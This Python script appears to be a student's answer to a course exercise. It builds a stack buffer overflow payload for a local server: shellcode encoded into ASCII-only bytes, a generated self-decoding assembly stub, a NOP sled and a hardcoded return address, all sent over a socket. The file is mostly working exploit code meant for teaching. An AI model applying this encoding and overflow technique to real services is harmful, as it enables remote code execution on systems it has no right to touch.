#!/usr/bin/python

import os, socket
import q2, assemble, struct


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f


def get_raw_shellcode():
    return q2.get_shellcode()


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''

    # TODO: IMPLEMENT THIS FUNCTION

    
    #get the shellcode
    shellcode = list(get_raw_shellcode ())

    #xoring each byte that is >= 0x80
    for i in range (0, (len(shellcode))):
        byte = ord(shellcode[i])
        if byte >= 0x80:
            byte ^= 0xff
        shellcode[i] =  chr(byte)

    return ''.join(shellcode)

    #raise NotImplementedError()

    # NOTES:
    # 1. Don't delete this function - we are going to test it directly.
    # 2. You should use the shellcode you implemented in the previous question,
    #    by calling `get_raw_shellcode()`


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''

    # TODO: IMPLEMENT THIS FUNCTION
    create_decoder ()
    decoder = assemble.assemble_file('decoder.asm')
    encoded_shellcode = get_shellcode ()
    nop = "\x41" #inc ecx   
    nop_num = 1040 - (len(encoded_shellcode) + len(decoder))
    #return_address = '\xe8\xdd\xff\xbf' # the return address is 0xbfffdde8

    start_of_buffer =  0xbfffdd8c #the start of the buffer address 0xbfffdd8c
    return_address_int = (nop_num/2) + start_of_buffer
    return_address = struct.pack('L', return_address_int)

    msg = (nop * nop_num) + decoder + encoded_shellcode + return_address
    size = struct.pack('>L', len(msg))

    return size + msg

 

    #raise NotImplementedError()

    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.

#This function create the decoder's shellcode to a file decoder.asm
def create_decoder():
    #get the shellcode 
    shellcode = get_raw_shellcode ()
    #len of the shllcode + 4 for the return address
    lenght = len(shellcode) + 4 
    #create new file for the decoder.asm
    with open('decoder.asm', 'wb') as file:
        file.write("push esp;\n")
        file.write("pop eax;\n")

        #get the start of the shellcode
        while lenght >= 128:
            # the loop is like file.write("sub eax, 127\n")
            for i in range (0,127):
                file.write("dec eax;\n")
            lenght -= 127 


        # the following loop is like file.write("sub eax, %d\n" %lenght) 

        for i in range (0, lenght):
            file.write("dec eax;\n")

        file.write("push 0x00000000;\n")
        file.write("pop ebx;\n")
        file.write("dec ebx\n") #ebx is now 0xffffffff, so bl is now 0xff
        offset = 0

        #go over the un-encoded shellcode to find the offsets in it there is bytes that are >= 128.
        #xor each byte with 0xff to get from the encoded shellcode the origin shellcode
        for i in range (0, (len(shellcode))):
            if i <= 128:
                offset = i
            else:
                offset += 1
            byte = ord(shellcode[i])
            if byte >= 0x80:
                if offset >= 128:
                    #file.write("add eax, 127\n")
                    for i in range (0,127):
                        file.write("inc eax;\n")

                    offset -= 127
                file.write("xor byte ptr[eax+%d], bl;\n" % offset)
















def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
